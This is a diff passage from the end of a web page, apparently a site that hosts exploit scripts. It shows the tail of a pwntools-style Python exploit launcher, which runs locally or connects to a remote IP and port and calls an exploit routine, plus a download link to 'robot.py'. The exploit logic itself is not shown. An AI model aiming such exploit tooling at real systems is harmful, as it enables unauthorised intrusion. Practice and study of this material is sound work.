+</span><span>        </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">p</span><span style="color:#89ddff;">,</span><span style="color:#7aa2f7;">elf</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">elif </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">&lt;= </span><span style="color:#ff9e64;">6 </span><span style="color:#bb9af7;">and </span><span>argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">1</span><span style="color:#9abdf5;">] </span><span style="color:#bb9af7;">== </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">remote</span><span style="color:#89ddff;">&quot;</span><span style="color:#9abdf5;">:
+</span><span>        context</span><span style="color:#89ddff;">.</span><span>binary </span><span style="color:#89ddff;">= </span><span>elf </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">ELF</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">2</span><span style="color:#9abdf5;">])
+</span><span>        p </span><span style="color:#89ddff;">= </span><span style="color:#7aa2f7;">remote</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">3</span><span style="color:#9abdf5;">]</span><span style="color:#89ddff;">, </span><span style="color:#0db9d7;">int</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">[</span><span style="color:#ff9e64;">4</span><span style="color:#9abdf5;">]))
+</span><span>        </span><span style="color:#bb9af7;">if </span><span style="color:#89ddff;">&quot;</span><span style="color:#9ece6a;">debug</span><span style="color:#89ddff;">&quot; </span><span style="color:#bb9af7;">in </span><span>argv</span><span style="color:#9abdf5;">: </span><span>context</span><span style="color:#89ddff;">.</span><span>log_level </span><span style="color:#89ddff;">= &quot;</span><span style="color:#9ece6a;">DEBUG</span><span style="color:#89ddff;">&quot;
+</span><span>        </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">p</span><span style="color:#89ddff;">, </span><span style="color:#7aa2f7;">elf</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">elif </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">&gt; </span><span style="color:#ff9e64;">5</span><span style="color:#9abdf5;">:
+</span><span>        </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">error: too much params specified</span><span style="color:#89ddff;">\n&#39; + </span><span style="color:#7aa2f7;">usage</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#7aa2f7;">exit</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">elif </span><span style="color:#2ac3de;">len</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">argv</span><span style="color:#9abdf5;">) </span><span style="color:#bb9af7;">&lt;= </span><span style="color:#ff9e64;">3</span><span style="color:#9abdf5;">:
+</span><span>        </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">error: you forgot ip or/and port</span><span style="color:#89ddff;">\n&#39; + </span><span style="color:#7aa2f7;">usage</span><span style="color:#9abdf5;">)
+</span><span>        </span><span style="color:#7aa2f7;">exit</span><span style="color:#9abdf5;">(</span><span style="color:#ff9e64;">0</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#bb9af7;">else</span><span style="color:#9abdf5;">:
+</span><span>        </span><span style="color:#2ac3de;">print</span><span style="color:#9abdf5;">(</span><span style="color:#7aa2f7;">usage</span><span style="color:#9abdf5;">)
+</span></code></pre>
+<p><a href="/exploits/robot.py">download here</a></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
